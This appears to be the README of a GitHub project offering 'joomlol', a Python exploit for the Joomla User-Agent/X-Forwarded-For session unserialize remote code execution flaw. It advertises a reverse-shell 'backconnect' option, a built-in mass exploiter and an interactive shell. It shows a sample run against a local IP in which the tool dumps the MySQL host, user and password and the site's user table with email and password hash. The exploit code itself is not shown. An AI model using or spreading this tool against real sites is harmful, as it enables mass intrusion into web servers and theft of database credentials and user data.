# joomlol
Joomla User-Agent/X-Forwarded-For RCE

Exploit for Joomla's unserialize session handling RCE. Drop your own payload or use the backconnect. Mass exploiter built in(no threading cuz imgay), interactive shell too. Whatever, figured my github needed some lovin' from me for once.

```
@skr0 ➜ python2.7 joomlol.py -t http://192.168.1.134/ -i
    .---.    .-'''-.        .-'''-.                             .-'''-.          
    |   |   '   _    \     '   _    \                  .---.   '   _    \  .---. 
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   |   | /   /` '.   \ |   | 
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. |   |.   |     \  ' |   | 
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '|   ||   '      |  '|   | 
    |   |\    \     / / \    \     / / |  |  |  |  |  ||   |\    \     / / |   | 
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  ||   | `.   ` ..' /  |   | 
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||   |    '-...-'`   |   | 
    |   |                              |  |  |  |  |  ||   |               |   | 
    |   |                              |__|  |__|  |__||   |               |   | 
 __.'   '                                              '---'               '---' 
|      '                                                                         
|____.'                                                                          
          Joomla User-Agent/X-Forwarded-For RCE
[+] testing one two on dat http://192.168.1.134/
[+] first request: a solid 200
[+] moneyshot is a gohoho

[+] PHP uname: Linux skr0nk 3.16.0-57-generic #77~14.04.1-Ubuntu SMP Thu Dec 17 23:20:00 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
[+] Gathering DBMS Data...
[*] MySQL Host: localhost
[*] MySQL User: root
[*] MySQL Password: lol
[*] MySQL Database: lol_www
[!] FTP Disabled on this host, skipping.
[+] Now to grab usertables...
[*] Username: dongs   Email: dongs@fbi.lol   Password: $2y$10$Kz64bcYEOzoqLct./DDFEOAOTb6VDc0kQSM0HXmDmEcylNWW0EOq2```
